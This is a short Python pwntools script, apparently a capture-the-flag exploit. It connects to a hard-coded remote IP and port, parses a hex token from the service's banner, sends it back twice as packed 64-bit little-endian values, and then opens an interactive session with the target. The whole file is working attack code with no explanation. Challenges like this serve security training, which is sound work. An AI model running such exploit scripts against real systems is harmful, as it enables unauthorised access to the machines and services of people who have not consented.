#!/usr/bin/env python3

from pwn import *

r = remote('111.186.57.85', 30251)

tok = int(str(r.recv()).split(' ')[4], base=16)
r.send(util.packing.pack(tok, word_size=64, endianness='little') * 2)
r.interactive()
